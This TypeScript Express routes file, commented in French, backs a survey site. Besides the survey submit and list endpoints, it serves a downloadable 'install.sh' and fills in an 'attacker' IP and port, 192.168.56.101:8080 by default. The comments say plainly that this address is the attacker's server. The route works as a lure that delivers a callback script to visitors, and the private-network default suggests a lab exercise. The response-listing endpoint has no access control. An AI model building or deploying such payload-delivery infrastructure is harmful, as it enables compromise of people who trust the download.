import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertSurveyResponseSchema } from "@shared/schema";
import { z } from "zod";
import { readFileSync } from "fs";
import { join } from "path";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  
  // Servir le script d'installation
  app.get("/install.sh", (req, res) => {
    try {
      const installScript = readFileSync(join(__dirname, "install.sh"), "utf-8");
      
      // Remplacer l'IP de l'attaquant dans le script
      // L'IP de l'attaquant est celle du serveur qui héberge le serveur attaquant
      const attackerIp = process.env.ATTACKER_SERVER_IP || "192.168.56.101";
      const attackerPort = process.env.ATTACKER_SERVER_PORT || "8080";
      
      const modifiedScript = installScript
        .replace(/\$\{ATTACKER_IP:-192\.168\.56\.101\}/g, attackerIp)
        .replace(/\$\{ATTACKER_PORT:-8080\}/g, attackerPort);
      
      res.setHeader("Content-Type", "text/x-sh");
      res.setHeader("Content-Disposition", "attachment; filename=install.sh");
      res.send(modifiedScript);
    } catch (error) {
      console.error("Erreur lors de la lecture du script:", error);
      res.status(500).send("Erreur lors du téléchargement du script");
    }
  });
  
  app.post("/api/survey", async (req, res) => {
    try {
      const { acceptTerms, ...surveyData } = req.body;
      
      const validatedData = insertSurveyResponseSchema.parse(surveyData);
      
      const response = await storage.createSurveyResponse(validatedData);
      
      res.status(201).json({ 
        success: true, 
        message: "Reponse enregistree avec succes",
        id: response.id 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          success: false, 
          message: "Donnees invalides", 
          errors: error.errors 
        });
      } else {
        console.error("Erreur lors de l'enregistrement:", error);
        res.status(500).json({ 
          success: false, 
          message: "Erreur interne du serveur" 
        });
      }
    }
  });

  app.get("/api/survey/responses", async (req, res) => {
    try {
      const responses = await storage.getAllSurveyResponses();
      res.json({ success: true, data: responses });
    } catch (error) {
      console.error("Erreur lors de la recuperation:", error);
      res.status(500).json({ 
        success: false, 
        message: "Erreur interne du serveur" 
      });
    }
  });

  return httpServer;
}
